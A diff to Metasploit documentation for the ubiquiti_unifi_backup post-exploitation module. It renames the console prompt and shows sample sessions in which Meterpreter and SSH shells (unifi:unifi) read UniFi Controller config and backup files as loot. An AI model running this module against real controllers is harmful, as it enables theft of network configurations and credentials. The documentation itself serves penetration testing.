@@ -88,7 +88,7 @@ resource (unifi.rb)> run
 #### Details
 
 ```
-msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions -i 2
+msf post(multi/gather/ubiquiti_unifi_backup) > sessions -i 2
 [*] Starting interaction with 2...
 
 meterpreter > getuid
@@ -101,7 +101,7 @@ BuildTuple   : i486-linux-musl
 Meterpreter  : x86/linux
 meterpreter > background
 [*] Backgrounding session 2...
-msf5 post(multi/gather/ubiquiti_unifi_backup) > loot
+msf post(multi/gather/ubiquiti_unifi_backup) > loot
 
 Loot
 ====
@@ -164,7 +164,7 @@ resource (unifi.rb)> run
 #### Details
 
 ```
-msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions -i 3
+msf post(multi/gather/ubiquiti_unifi_backup) > sessions -i 3
 [*] Starting interaction with 3...
 
 meterpreter > getuid
@@ -179,7 +179,7 @@ Logged On Users : 1
 Meterpreter     : x86/windows
 meterpreter > background
 [*] Backgrounding session 3...
-msf5 post(multi/gather/ubiquiti_unifi_backup) > loot
+msf post(multi/gather/ubiquiti_unifi_backup) > loot
 
 Loot
 ====
@@ -197,7 +197,7 @@ host           service  type                                      name          
 #### Module
 
 ```
-msf5 post(multi/gather/ubiquiti_unifi_backup) > rexploit
+msf post(multi/gather/ubiquiti_unifi_backup) > rexploit
 [*] Reloading module...
 
 [+] Read UniFi Controller file /Users/unifi/Library/Application Support/Unifi/data/system.properties
@@ -214,7 +214,7 @@ An example of the output when not utilizing meterpreter (just a shell) to access
 work successfully.
 
 ```
-msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions
+msf post(multi/gather/ubiquiti_unifi_backup) > sessions
 
 Active sessions
 ===============
@@ -224,9 +224,9 @@ Active sessions
   1         shell linux            SSH unifi:unifi (1.1.1.1:22)                              2.2.2.2:35125 -> 1.1.1.1:22 (1.1.1.1)
   2         meterpreter x86/linux  uid=1000, gid=1000, euid=1000, egid=1000 @ 1.1.1.1        2.2.2.2:4433 -> 1.1.1.1:52584 (1.1.1.1)
 
-msf5 post(multi/gather/ubiquiti_unifi_backup) > session -i 1
+msf post(multi/gather/ubiquiti_unifi_backup) > session -i 1
 l[-] Unknown command: session.
-msf5 post(multi/gather/ubiquiti_unifi_backup) > sessions -i 1
+msf post(multi/gather/ubiquiti_unifi_backup) > sessions -i 1
 [*] Starting interaction with 1...
 
 ls -lah /var/lib/unifi/backup/*.unf
@@ -235,9 +235,9 @@ ls -lah /var/lib/unifi/backup/*.unf
 -rw-r----- 1 unifi unifi 3.3M May 10 14:26 /var/lib/unifi/backup/5.10.23.unf
 ^Z
 Background session 1? [y/N]  y
-msf5 post(multi/gather/ubiquiti_unifi_backup) > set session 1
+msf post(multi/gather/ubiquiti_unifi_backup) > set session 1
 session => 1
-msf5 post(multi/gather/ubiquiti_unifi_backup) > run
+msf post(multi/gather/ubiquiti_unifi_backup) > run
 
 [!] SESSION may not be compatible with this module.
 [+] Read UniFi Controller file /var/lib/unifi/system.properties
